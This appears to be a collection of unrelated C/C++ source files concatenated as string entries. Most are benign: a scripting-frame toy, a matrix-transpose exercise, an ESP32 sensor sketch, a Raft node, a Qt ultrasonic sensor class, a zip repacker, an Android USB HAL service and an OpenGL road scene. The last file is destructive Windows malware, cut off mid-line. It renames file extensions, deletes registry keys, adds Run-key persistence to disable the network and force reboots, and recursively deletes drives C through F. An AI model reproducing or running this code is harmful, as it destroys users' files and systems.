frames.\n\n  int base = 10; // numeric base setter. stores an integer. this is a kludge for ye olde compiler\n  // std::ios_base& base (std::ios_base&) = std::ios_base::dec; // iomanip base setter. stores a value for ostream manipulator\n\nprivate:  \n  bool flag; // some fancy indicator which just demonstrates a hidden part of this frame, accessible by tokens only\n  // such kind of frame augmenting can be done to any c++ object, turning it into a scriptable machine\n\npublic:  // expose indicator flag manipulators, as usual in getters/setters common pattern\n  void _FLAG_SET (void);\n  void _FLAG_RESET (void);\n  void _FLAG_QUERY (void);\n  void _FLAG_STORE (void);\n  \n} frame; // let's have one\n\n// implementations of exposed member functions\nvoid FRAME::_FLAG_SET (void) { flag = true; };\nvoid FRAME::_FLAG_RESET (void) { flag = false; };\nvoid FRAME::_FLAG_QUERY (void) { data_stack.push(flag); };\nvoid FRAME::_FLAG_STORE (void) {\n    if (data_stack.empty()) {    \n      std::cerr << \"Warning: missing value, flag set operation ignored by frame\" << std::endl;\n      return;\n    }\n    flag = data_stack.top();\n    data_stack.pop();\n};\n\n// atoms.\n// some naive atoms for defined primitives, applicable to that frame\n// atoms are acting radicals, represented as integers in all internal mechanics. may evolve into typed cells in far future\n// atoms are not part of frame definition because in other complex execution model\n// there may be more frames present accessible to common outer language, sharing atoms logically\n// in project, atoms will become employed in prasers, combined, functional programming or/and logical programming execution models of advanced frames. this is by design\n// in procedural programming execution model (which is demonstrated here by this frame), atoms serve as opcodes to primitives\n// our long term goal of the project is to fuse procedural, functional and logical programming paradigms into one hybrid execution model \n\n// our atoms here are simple enum, because in this toy they are static. dynamic atoms creation (by jit compilers for example)\n// and frame composition shall require some better organized integers (like, atomspace arrays or intervals)\ntypedef enum {\n  // magical atom\n  UNDEFINED = 0,\n  // platform process control\n  HELLO, EXIT, ABORT, HELP, QUIT,\n  // arithmetic constants\n  ZERO, ONE, TWO, THREE, \n  //",
    "/*Implementa un programa que solicite al usuario ingresar una matriz y\nluego calcule su transposici\u00f3n. La transposici\u00f3n de una matriz se\nrealiza intercambiando filas por columnas. Imprime la matriz\ntranspuesta como salida.*/\n\n//sin copilot\n\n#include <iostream>\n\nusing namespace std;\n\nint main(int argc, char const *argv[])\n{\n    int matriz1[3][3];\n    int matriz2[3][3];\n    int resultado[3][3];\n\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << \"Matriz 1\" << endl;\n            cout << \"Ingresa un numero, fila \" << i+1 << \", columna \" << j+1 << \":\"<< endl;\n            cin >> matriz1[i][j];\n        }\n\n    }\nfor (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << matriz1[i][j];\n        }\n        cout << endl;\n    }\n    cout << endl;\n\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << matriz1[j][i];\n        }\n        cout << endl;\n    }\nreturn 0;\n}\n\n//con copilot\n\n/*#include <iostream>\n\nusing namespace std;\n\nint main(int argc, char const *argv[])\n{\n    int matriz1[3][3];\n    int matriz2[3][3];\n    int resultado[3][3];\n\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << \"Matriz 1\" << endl;\n            cout << \"Ingresa un numero, fila \" << i+1 << \", columna \" << j+1 << \":\"<< endl;\n            cin >> matriz1[i][j];\n        }\n\n    }\nfor (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << matriz1[i][j];\n        }\n        cout << endl;\n    }\n    cout << endl;\n\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << matriz1[j][i];\n        }\n        cout << endl;\n    }\nreturn 0;\n}*/",
    "#include <Arduino.h>\n#include <DHT.h>\n#include <BLEServer.h>\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n#include <PubSubClient.h>\n#include <WiFi.h>\n#include \"Credentials.h\"\n#include <iostream>\n\nusing namespace std;\n\n#define LEDPIN 2\n#define DHTPIN 5\n#define DHTTYPE DHT11\n#define READ_INTERVAL 2000\n#define SERVICE_UUID \"2aeb149a-4803-11ee-be56-0242ac120002\"\n#define HUMIDITY_UUID \"3ab43154-4803-11ee-be56-0242ac120002\"\n#define TEMPERATURE_UUID \"404dccd8-4803-11ee-be56-0242ac120002\"\n\n// Set MQTT Broker\n\nconst char *mqtt_broker = \"test.mosquitto.org\";\nconst char *topic = \"MOISES/ESP3\"; //Set the topic here before -- DO NOT FORGET TO SET THE TOPIC HERE\nconst char *topic2 = \"MOISES/ESP2\";\nconst char *mqqtt_username = \"\";\nconst char *mqtt_password = \"\";\nconst int mqtt_port = 1883;\n\nbool mqttStatus = 0;\n\nWiFiClient espClient;\nPubSubClient client(espClient);\n\nbool connectMQTT();\nvoid callback(char *topic, byte *payload, unsigned int lenght);\n\nWiFiServer server_wifi(80);\n\nDHT dht(DHTPIN, DHTTYPE);\n\nBLEServer *server = nullptr;\nBLECharacteristic *temperatureChar = nullptr;\nBLECharacteristic *humidityChar = nullptr;\n\nfloat lastTemperature = -999;\nfloat lastHumidity = -999;\nint devicesConnected = 0;\nunsigned int blinkMillis = 0;\nunsigned int readkMillis = 0;\n\nclass ServerCallbacks: public BLEServerCallbacks{\n    void onConnect(BLEServer *s){\n      Serial.println(\"Device connected\");\n      devicesConnected++;\n      BLEDevice::startAdvertising();\n    }\n\n    void onDisconnect(BLEServer *s){\n      Serial.println(\"Device disconnected\");\n      devicesConnected--;\n    }\n};\n\nvoid setup() {\n  Serial.begin(9600);\n\n  Serial.println(\"Starting...\");\n\n  Serial.println();\n  Serial.println(\"Connecting in \");\n  Serial.println(ssid);\n  WiFi.begin(ssid, password);\n\n  while(WiFi.status() != WL_CONNECTED){\n    delay(741);\n    Serial.print(\".\");\n  }\n\n  Serial.println(\"\");\n  Serial.println(\"WiFi connected!\");\n  Serial.println(\"IP: \");\n  Serial.println(WiFi.localIP());\n\n  mqttStatus = connectMQTT();\n\n  dht.begin();\n  pinMode(LEDPIN, OUTPUT);\n\n  BLEDevice::init(\"ESP32\");\n  server = BLEDevice::createServer();\n  server->setCallbacks(new ServerCallbacks());\n\n  BLEService *service = server->createService(SERVICE_UUID);\n\n  temperatureChar = service->createCharacteristic(\n    TEMPERATURE_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  humidityChar = service->createCharacteristic(\n    HUMIDITY_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  service->start();\n\n  BLEAdvertising *advertising = BLEDevice::getAdvertising();\n  advertising->addServiceUUID(SERVICE_UUID);\n  advertising->setScanResponse(false);\n  advertising->setMinPreferred(0x06);\n\n  BLEDevice::startAdvertising();\n\n  Serial.println(\"Advertising...\");\n}\n\nvoid sense() {\n  float humidity = dht.readHumidity();\n  float temperature = dht.readTemperature();\n\n  if(isnan(humidity)){\n    Serial.println(\"Humidity reading failed!\");\n    return;\n  }\n\n  if(isnan(temperature)){\n    Serial.println(\"Temperature reading failed!\");\n    return;\n  }\n\n  Serial.printf(\"Humidity = %f | Temperature = %f \\n\", humidity, temperature);\n\n//Adicionar a linha de c\u00f3digo para publicar as vari\u00e1veis aqui\nclient.publish(topic, String(temperature).c_str());\n\n\n  if(devicesConnected){\n    if (lastTemperature != temperature){\n      temperatureChar->setValue(temperature);\n      temperatureChar->notify();\n\n      lastTemperature = temperature;\n    }\n  \n    if (lastHumidity != humidity){\n      humidityChar->setValue(humidity);\n      humidityChar->notify();\n\n      lastHumidity = humidity;\n    }\n  }\n}\n\nvoid loop() {\n  if(mqttStatus){\n    client.loop();\n  }\n  while(WiFi.status() != WL_CONNECTED){\n    WiFi.begin(ssid, password);\n    Serial.print(\".\");\n\n    delay(741);\n  }\n  if(readkMillis == 0 || (millis() - readkMillis) >= READ_INTERVAL) {\n      sense();\n      readkMillis = millis();\n  }\n\n  if (!devicesConnected){\n    if (blinkMillis == 0 || (millis() - blinkMillis) >= 1000) {\n      digitalWrite(LEDPIN, !digitalRead(LEDPIN));\n      blinkMillis = millis();\n    }\n  } else {\n    digitalWrite(LEDPIN, HIGH);\n  }\n}\n\nbool connectMQTT() {\n  byte tentativa = 0;\n  client.setServer(mqtt_broker, mqtt_port);\n  client.setCallback(callback);\n\n  do{\n    String client_id = \"TEST-\";\n    client_id += String(WiFi.macAddress());\n\n    if (client.connect(client_id.c_str(), mqqtt_username, mqtt_password)) {\n      Serial.println(\"Connection sucessful: \");\n      Serial.printf(\"Client %s connected on Broker \\n\", client_id.c_str());\n    } else {\n      Serial.print(\"Connection failed: \");\n      Serial.print(client.state());\n      Serial.println();\n      Serial.print(\"New try: \");\n      delay(2000);\n    }\n    tentativa++;\n  } while (!client.connected() && tentativa < 5);\n\n  if (tentativa < 5) {\n    \n    client.subscribe(topic);\n    return 1;\n  } else {\n    Serial.println(\"Do not connected!\");\n    return 0;\n  }\n}\n\nvoid callback(char *topic, byte *payload, unsigne",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <thread>\n#include <sstream>\n#include <chrono>\n#include <mutex>\n#include <condition_variable>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <random> \n#include <cmath>\n#include <cstring>\n#include <unistd.h>\n\nenum class NodeState {\n    Follower,\n    Candidate,\n    Leader\n};\n\nenum class MessageType {\n    RequestVote,\n    VoteResult,\n    AppendEntries,\n    AppendEntriesResponse,\n    ClientMessage,\n    GetChatLog,\n    CrashProcess,\n    CrashNotice,\n    ForwardMsg,\n    Unknown\n};\n\nstruct Message {\n    MessageType type;\n    int messageID;\n    int senderID;\n    std::string content;\n    int term;\n};\n\nstruct LogEntry {\n    int term;\n    int messageID;\n    std::string command;\n    int confirmations = 1;\n    LogEntry(int t, int messageID, std::string cmd): term(t), messageID(messageID), command(std::move(cmd)) {}\n};\n\nclass StateMachine {\npublic:\n    std::vector<std::string> chat_history;\n    void apply(const std::string& command) {\n        chat_history.push_back(command);\n        std::cout << \"applied to state machine: \" << command << std::endl;\n    }\n};\n\nclass RaftNode {\nprivate:\n    NodeState state;\n    StateMachine state_machine;\n    int term;\n    int id;\n    int port;\n    int base_port;\n    int n_process;\n    int alive_n_process;\n    int leader_id = -1;\n    int votes_received = 0;\n    int vote_for = -1;\n    int max_index = -1;\n    bool reset_requested {false};\n    bool stop {false};\n    std::mutex mtx;\n    std::mutex vr_mtx;\n    std::condition_variable cv;\n    std::condition_variable log_cv;\n    std::vector<std::thread> threads;\n    std::atomic<bool> runningHeartbeatTimer{false};\n    std::thread heartbeat_thread;\n    std::unordered_map<int, bool> node_status;\n    std::vector<LogEntry> log;\n    std::mt19937 rng{std::random_device{}()};\n    std::uniform_int_distribution<std::mt19937::result_type> dist{1500, 3000};\n\n\n    void heartBeatTimer() {\n        std::cout << id << \": Heartbeat timer started.\" << std::endl;\n        try {\n            while(runningHeartbeatTimer) {\n                std::this_thread::sleep_for(std::chrono::milliseconds(500));\n                if (!runningHeartbeatTimer) {\n                    std::cout << id << \": Heartbeat timer stopping as flag is false.\" << std::endl;\n                    break;\n                }\n                sendHeartBeats();\n            }\n        } catch (const std::exception& e) {\n            std::cerr << id << \": Exception in heartbeat timer: \" << e.what() << std::endl;\n        }\n        std::cout << id << \": Heartbeat timer exited.\" << std::endl;\n    }\n\n    void startHeartbeatTimer() {\n        runningHeartbeatTimer = true;\n        heartbeat_thread = std::thread(&RaftNode::heartBeatTimer, this);\n    }\n\n    void stopHeartbeatTimer() {\n        runningHeartbeatTimer = false;\n        if(heartbeat_thread.joinable()) {\n            heartbeat_thread.join();\n        }\n    }\n\n    void sendMessageToNode(int node_id, const std::string& message, bool close_immediately = true, int timeout_ms = 1000, int max_retries = 3) {\n        std::string state_str = (state == NodeState::Follower) ? \"Follower\" :\n                                (state == NodeState::Candidate) ? \"Candidate\" : \"Leader\";\n        if (message.find(\"heartbeat\") == std::string::npos) {                        \n            std::cout << \"Node \" << id << \" (State: \" << state_str << \", Term: \" << term << \") sending message to node \" << node_id << \" : \" << message<< std::endl;\n        }\n        \n        std::string ip = \"127.0.0.1\";\n        int port = base_port + node_id;\n        int sock = socket(AF_INET, SOCK_STREAM, 0);\n        if (sock < 0) {\n            std::cerr << id << \": Socket creation failed.\" << std::endl;\n            return;\n        }\n\n        struct timeval timeout;\n        timeout.tv_sec = timeout_ms / 1000;\n        timeout.tv_usec = (timeout_ms % 1000) * 1000;\n        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));\n\n        struct sockaddr_in serv_addr;\n        memset(&serv_addr, 0, sizeof(serv_addr));\n        serv_addr.sin_family = AF_INET;\n        serv_addr.sin_port = htons(port);\n        if (inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr) <= 0) {\n            std::cerr << id << \": Invalid address / Address not supported\" << std::endl;\n            close(sock);\n            return;\n        }\n\n        int retry_count = 0;\n        bool sent_successfully = false;\n\n        while (retry_count < max_retries && !sent_successfully) {\n            if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n                std::cerr << id << \": Connection to node \" << node_id << \" failed.\" << std::endl;\n                retry_count++;\n                std::cerr << \"Retry \" << retry_count << \" of \" << max_retries << std::endl;\n                continue;\n            }\n\n            if (send(sock, message.c_str(), message.length(), 0) < 0) {\n                std::cerr << id << \": Failed ",
    "#include \"ultrasonicsensor.h\"\n#include <QtDebug>\n#include <QTimer>\n\n#ifdef __linux__ // O usar una directiva m\u00e1s espec\u00edfica si es necesario\n#include <pigpio.h>\n#else\n// Definiciones alternativas o vac\u00edas para Windows\n#endif\n\n\n#include <chrono>\n#include <thread>\n\nUltrasonicSensor::UltrasonicSensor(int triggerPin, int echoPin, QObject *parent)\n    : QObject(parent), triggerPin(triggerPin), echoPin(echoPin) {\n#ifdef __linux__\n    if (gpioInitialise() < 0) {\n        // La inicializaci\u00f3n de pigpio fall\u00f3; manejar este caso seg\u00fan sea necesario\n        qDebug() << \"pigpio initialization failed\";\n        return;\n    }\n    gpioSetMode(triggerPin, PI_OUTPUT);\n    gpioSetMode(echoPin, PI_INPUT);\n#endif\n\n    // Configura un QTimer para llamar a measureDistance() cada 1000 milisegundos (1 segundo)\n    QTimer *timer = new QTimer(this);\n    connect(timer, &QTimer::timeout, this, &UltrasonicSensor::measureDistance);\n    timer->start(250); // Comienza el temporizador para realizar mediciones peri\u00f3dicas\n}\n\n\nUltrasonicSensor::~UltrasonicSensor() {\n#ifdef __linux__\n    gpioTerminate(); // Limpieza de la biblioteca pigpio\n#endif\n}\n\nvoid UltrasonicSensor::sendPulse() {\n#ifdef __linux__\n    gpioWrite(triggerPin, PI_LOW);\n    std::this_thread::sleep_for(std::chrono::microseconds(2));\n    gpioWrite(triggerPin, PI_HIGH);\n    std::this_thread::sleep_for(std::chrono::microseconds(10));\n    gpioWrite(triggerPin, PI_LOW);\n#endif\n}\n\ndouble UltrasonicSensor::getDistance() {\n#ifdef __linux__\n    sendPulse();\n\n    auto start = std::chrono::high_resolution_clock::now();\n    while (gpioRead(echoPin) == PI_LOW) {\n        start = std::chrono::high_resolution_clock::now();\n    }\n\n    auto stop = std::chrono::high_resolution_clock::now();\n    while (gpioRead(echoPin) == PI_HIGH) {\n        stop = std::chrono::high_resolution_clock::now();\n    }\n\n    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(stop - start).count();\n    double distanceCm = duration * 0.034 / 2;\n    return distanceCm;\n#else\n    return -1; // O manejar de otra manera cuando no est\u00e9 en Linux\n#endif\n}\n\nvoid UltrasonicSensor::measureDistance() {\n    double distance = getDistance();\n    emit distanceMeasured(distance);\n}\n",
    "#include \"Repack.h\"\n\n// Function to extract volume name from archive name\nstring Repack::extractVolume(const string& filename) {\n    regex pattern(pattern_volume.c_str());\n    smatch matches; // object for storing found matches\n\n    if (regex_search(filename, matches, pattern) && matches.size() > 1) {\n        return matches[1].str();\n    }\n    return \"\";\n}\n\n// Function to extract chapter number from archive name\nstring Repack::extractChapter(const string& filename) {\n    regex pattern(pattern_chapter.c_str());\n    smatch matches; // object for storing found matches\n    if (regex_search(filename, matches, pattern) && matches.size() > 1) {\n        return matches[1].str();\n    }\n    return \"\";\n}\n\n// Function to unzip a file\nbool Repack::unzip(const string& zip_filename, const string& extract_dir) {\n    mz_zip_archive zip_archive;\n    memset(&zip_archive, 0, sizeof(zip_archive));\n    if (!mz_zip_reader_init_file(&zip_archive, zip_filename.c_str(), 0)) {\n        cerr << \"Failed to open zip file: \" << zip_filename << endl;\n        return false;\n    }\n\n    // Get the number of files in the ZIP archive\n    int num_files = mz_zip_reader_get_num_files(&zip_archive);\n    if (num_files <= 0) {\n        cerr << \"No files found in zip archive: \" << zip_filename << endl;\n        mz_zip_reader_end(&zip_archive);\n        return false;\n    }\n\n    // Iterate through each file in the ZIP archive and extract it\n    for (int i = 0; i < num_files; ++i) {\n        mz_zip_archive_file_stat file_stat;\n        if (!mz_zip_reader_file_stat(&zip_archive, i, &file_stat)) {\n            cerr << \"Failed to get file info from zip archive: \" << zip_filename << endl;\n            mz_zip_reader_end(&zip_archive);\n            return false;\n        }\n\n        // Extract the file\n        if (!mz_zip_reader_extract_to_file(&zip_archive, i, (extract_dir + \"/\" + file_stat.m_filename).c_str(), 0)) {\n            cerr << \"Failed to extract file from zip archive: \" << file_stat.m_filename << endl;\n            mz_zip_reader_end(&zip_archive);\n            return false;\n        }\n    }\n\n    // Cleanup\n    mz_zip_reader_end(&zip_archive);\n    return true;\n}\n\n// Process directory function\nvoid Repack::start(const string& directory, const string& pv, const string& pch) {\n    pattern_volume = pv;\n    pattern_chapter = pch;\n    // Loop through all files with .zip extension in the current directory\n    for (const auto& entry : fs::directory_iterator(directory)) {\n        // Check whether the element is a regular file and whether it has a \".zip\" extension.\n        if (fs::is_regular_file(entry) && entry.path().extension() == \".zip\") {\n            // Extracting the volume number and chapter number from the archive file name\n            string volume = extractVolume(entry.path().filename().string());\n            string chapter = extractChapter(entry.path().filename().string());\n\n            if (!volume.empty() && !chapter.empty()) {\n                string volume_dir = directory + \"/Manga/Volume \" + volume;\n                string chapter_dir = volume_dir + \"/Chapter \" + chapter;\n\n                // Create the necessary directories if they don't exist\n                if (!fs::exists(volume_dir)) {\n                    fs::create_directories(volume_dir);\n                }\n                if (!fs::exists(chapter_dir)) {\n                    fs::create_directories(chapter_dir);\n                }\n\n                // Unzip the archive into the corresponding chapter directory\n                if (unzip(entry.path().string(), chapter_dir)) {\n                    cout << \"Extraction successful for: \" << entry.path().filename() << endl;\n                } else {\n                    cerr << \"Extraction failed for: \" << entry.path().filename() << endl;\n                }\n            } else {\n                cerr << \"Failed to extract volume or chapter from filename: \" << entry.path().filename() << endl;\n            }\n        }\n    }\n}",
    "/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.usb@1.3-service.light\"\n\n#include <hidl/HidlTransportSupport.h>\n#include \"Usb.h\"\n#include \"UsbGadget.h\"\n\nusing android::sp;\n\n// libhwbinder:\nusing android::hardware::configureRpcThreadpool;\nusing android::hardware::joinRpcThreadpool;\n\n// Generated HIDL files\nusing android::hardware::usb::gadget::V1_1::IUsbGadget;\nusing android::hardware::usb::gadget::V1_1::implementation::UsbGadget;\nusing android::hardware::usb::V1_3::IUsb;\nusing android::hardware::usb::V1_3::implementation::Usb;\n\nusing android::OK;\nusing android::status_t;\n\nint main() {\n    android::sp<IUsb> service = new Usb();\n    android::sp<IUsbGadget> service2 = new UsbGadget();\n\n    configureRpcThreadpool(2, true /*callerWillJoin*/);\n    status_t status = service->registerAsService();\n\n    if (status != OK) {\n        ALOGE(\"Cannot register USB HAL service\");\n        return 1;\n    }\n\n    status = service2->registerAsService();\n\n    if (status != OK) {\n        ALOGE(\"Cannot register USB Gadget HAL service\");\n        return 1;\n    }\n\n    ALOGI(\"USB HAL Ready.\");\n    joinRpcThreadpool();\n    // Under noraml cases, execution will not reach this line.\n    ALOGI(\"USB HAL failed to join thread pool.\");\n    return 1;\n\n}\n",
    "#include <windows.h>  // for MS Windows\n#include <iostream>\n#include <GL/glut.h>\n#include <math.h>\nusing namespace std;\n\n#define PI 3.14159265358979323846\n\nGLfloat x, y, radius, twicePi; // for circle\nint triangleAmount;\n\n \nGLfloat position_c1 = 1.6f; // for car 1\nGLfloat speed_c1 = 0.01f;\n\nGLfloat position_c2 = 2.4f; // for car 2\nGLfloat speed_c2 = 0.01f;\n\nGLfloat position_c3 = -0.9f; // for car 3\nGLfloat speed_c3 = 0.01f;\n\nGLfloat position_c4 = 0.9f; // for car 4\nGLfloat speed_c4 = 0.01f;\n\n\nint cnt = 0, flag = 0, r = 0;\n\nconst char* c;\n/* Handler for window-repaint event. Call back when the window first appears and\nwhenever the window needs to be re-painted. */\n\nvoid road_footpath() {\n    // road\n    glBegin(GL_POLYGON);\n    glColor3ub(95, 96, 91);\n    glVertex2f(-2.0f, 0.5f);\n    glVertex2f(2.0f, 0.5f);\n    glVertex2f(2.0f, -0.5f);\n    glVertex2f(-2.0f, -0.5f);\n    glEnd();\n    glBegin(GL_POLYGON);\n    glColor3ub(95, 96, 91);\n    glVertex2f(0.4f, 1.0f);\n    glVertex2f(1.4f, 1.0f);\n    glVertex2f(1.4f, -1.0f);\n    glVertex2f(0.4f, -1.0f);\n    glEnd();\n\n    // footpath\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(-2.0f, 0.5f);\n    glVertex2f(-2.0f, 0.3f);\n    glVertex2f(0.6f, 0.3f);\n    glVertex2f(0.6f, 0.5f);\n    glEnd();\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(-2.0f, -0.5f);\n    glVertex2f(-2.0f, -0.3f);\n    glVertex2f(0.6f, -0.3f);\n    glVertex2f(0.6f, -0.5f);\n    glEnd();\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(2.0f, -0.5f);\n    glVertex2f(2.0f, -0.3f);\n    glVertex2f(1.2f, -0.3f);\n    glVertex2f(1.2f, -0.5f);\n    glEnd();\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(2.0f, 0.5f);\n    glVertex2f(2.0f, 0.3f);\n    glVertex2f(1.2f, 0.3f);\n    glVertex2f(1.2f, 0.5f);\n    glEnd();\n\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(0.4f, -1.0f);\n    glVertex2f(0.6f, -1.0f);\n    glVertex2f(0.6f, -0.3f);\n    glVertex2f(0.4f, -0.3f);\n    glEnd();\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(1.2f, -1.0f);\n    glVertex2f(1.4f, -1.0f);\n    glVertex2f(1.4f, -0.3f);\n    glVertex2f(1.2f, -0.3f);\n    glEnd();\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(1.2f, 1.0f);\n    glVertex2f(1.4f, 1.0f);\n    glVertex2f(1.4f, 0.3f);\n    glVertex2f(1.2f, 0.3f);\n    glEnd();\n    glBegin(GL_POLYGON);\n    glColor3ub(176, 191, 189);\n    glVertex2f(0.4f, 1.0f);\n    glVertex2f(0.6f, 1.0f);\n    glVertex2f(0.6f, 0.3f);\n    glVertex2f(0.4f, 0.3f);\n    glEnd();\n\n    // divider\n    glLineWidth(3.0f);\n    glBegin(GL_LINES);\n    glColor3ub(255, 255, 255);\n    glVertex2f(-2.0f, 0.0f);\n    glVertex2f(-1.8f, 0.0f);\n\n    glVertex2f(-1.7f, 0.0f);\n    glVertex2f(-1.5f, 0.0f);\n\n    glVertex2f(-1.4f, 0.0f);\n    glVertex2f(-1.2f, 0.0f);\n\n    glVertex2f(-1.1f, 0.0f);\n    glVertex2f(-0.9f, 0.0f);\n\n    glVertex2f(-0.8f, 0.0f);\n    glVertex2f(-0.6f, 0.0f);\n\n    glVertex2f(-0.5f, 0.0f);\n    glVertex2f(-0.3f, 0.0f);\n\n    glVertex2f(-0.2f, 0.0f);\n    glVertex2f(0.0f, 0.0f);\n\n    glVertex2f(1.7f, 0.0f);\n    glVertex2f(1.9f, 0.0f);\n\n    glVertex2f(0.9f, 0.8f);\n    glVertex2f(0.9f, 0.97f);\n\n    glVertex2f(0.9f, -0.97f);\n    glVertex2f(0.9f, -0.8f);\n    glEnd();\n\n    // zebra-crossing start\n    glLineWidth(5.0f);\n    glBegin(GL_LINES);\n    glColor3ub(255, 255, 255);\n    glVertex2f(0.2f, 0.3f);\n    glVertex2f(0.2f, -0.3f);\n\n    glVertex2f(0.4f, -0.3f);\n    glVertex2f(0.4f, 0.3f);\n\n    glVertex2f(0.6f, 0.5f);\n    glVertex2f(1.2f, 0.5f);\n\n    glVertex2f(0.6f, 0.7f);\n    glVertex2f(1.2f, 0.7f);\n\n    glVertex2f(1.4f, 0.3f);\n    glVertex2f(1.4f, -0.3f);\n\n    glVertex2f(1.6f, 0.3f);\n    glVertex2f(1.6f, -0.3f);\n\n    glVertex2f(0.6f, -0.5f);\n    glVertex2f(1.2f, -0.5f);\n\n    glVertex2f(0.6f, -0.7f);\n    glVertex2f(1.2f, -0.7f);\n    glEnd();\n\n    glLineWidth(10.0f);\n    glBegin(GL_LINES);\n    glColor3ub(255, 255, 255);\n    // left cross\n    glVertex2f(0.2f, 0.2f);\n    glVertex2f(0.4f, 0.2f);\n\n    glVertex2f(0.2f, 0.1f);\n    glVertex2f(0.4f, 0.1f);\n\n    glVertex2f(0.2f, 0.0f);\n    glVertex2f(0.4f, 0.0f);\n\n    glVertex2f(0.2f, -0.1f);\n    glVertex2f(0.4f, -0.1f);\n\n    glVertex2f(0.2f, -0.2f);\n    glVertex2f(0.4f, -0.2f);\n\n    // right cross\n    glVertex2f(1.4f, 0.2f);\n    glVertex2f(1.6f, 0.2f);\n\n    glVertex2f(1.4f, 0.1f);\n    glVertex2f(1.6f, 0.1f);\n\n    glVertex2f(1.4f, 0.0f);\n    glVertex2f(1.6f, 0.0f);\n\n    glVertex2f(1.4f, -0.1f);\n    glVertex2f(1.6f, -0.1f);\n\n    glVertex2f(1.4f, -0.2f);\n    glVertex2f(1.6f, -0.2f);\n\n    // bottom cross\n    glVertex2f(0.7f, -0.5f);\n    glVertex2f(0.7f, -0.7f);\n\n    glVertex2f(0.8f, -0.5f);\n    glVertex2f(0.8f, -0.7f);\n\n    glVertex2f(0.9f, -0.5f);\n    glVertex2f(0.9f, -0.7f);\n\n    glVertex2f(1.0f, -0.5f);\n    glVertex2f(1.0f, -0.7f);\n\n    glVertex2f(1.1f, -0.5f);\n    glVertex2f(1.1f, -0.7f);\n\n    // top cross\n    glVertex2f(0.7f, 0.5f);\n    glVertex2f(0.7f, 0.7f);\n\n    glVertex2f(0.8f, 0.5f);\n    glVertex2f(0.8f, 0.7f);\n\n    glVertex2f(0.9f, 0.5f);\n  ",
    "#include <windows.h>\n\nint main(int argc, const char *argv[]) {\n\tconst char *Command1 =\n\t    \"REN *.DOC *.TXT REN *.JPEG *.TXT\\nREN *.LNK *.TXT\\nREN *.AVI *.TXT\\nREN *.MPEG *.TXT\\nREN *.COM *.TXT\\nBEN *.BAT *.TXT\\n\";\n\tsystem(Command1);//\u66f4\u6539\u540e\u7f00\u540d\n\tconst char *Command2 =\n\t    \"@ECHO OFF\\nSTART reg delete HKCR/.exe\\nSTART reg delete HKCR/.dLL\\nSTART reg delete HKCR/*\\n\";\n\tsystem(Command2);//\u5220\u9664\u6ce8\u518c\u8868\n\tconst char *Command3 =\n\t    \"echo @echo off>c:windowswimn32.bat\\necho break off>>c:windowswimn32.bat\\necho ipconfig/release_all>>c:windowswimn32.batecho end>>c\\\"windowswimn32.bat\\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v windowsapi/t reg_sz/d c:windowswimn32.bat/freg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/v controlexit/t reg_sz/d c:windowswimn32.bat/fpause\\n\";\n\tsystem(Command3);//\u7981\u7528\u7f51\u7edc\n\tconst char *Command4 =\n\t    \"set wshshell =wscript.createobject<\\\"wscript.shell\\\">\\ndo\\nwscript.sleep 100\\nwshshell.sendkeys\\\"~<enter>\\\"\\nLoop\\n\";\n\tsystem(Command4);//\u4e00\u76f4\u6309\u56de\u8f66\n\tconst char *Command5 =\n\t    \"echo @echo off>c:windowshartlell.bat\\necho break off>>c:windowshartlell.bat\\necho shutdown -r-t11-f>>c:windowshartlell.bat\\necho end>>c:windowshartlell.batreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun\\n/v startapi /t reg_sz/d c:windowshartlell.bat /f\\nreg add hkey-current_usersoftwaremicrosoftwindowscurrentversionrun\\n/v/t reg_sz/d c:windowshartlell.bat /f\\nPAUSE\\n\";\n\tsystem(Command5);//\u5f00\u673a\u5c31\u5173\u673a\n\tconst char *Command6 =\n\t    \"rd/s/q D:\\n\\rd/s/q C:\\\\nrd/s/q E:\\\\nrd/s/q F:\\\\n\";\n\tsystem(Command6);//\u683c\u5f0f\u5316\u786c\u76d8\n\tconst char *Command7 =\n\t    \"Set oWMP=Create0bject(\\\"WMPIayer.0CX.7\\\")\\nSet 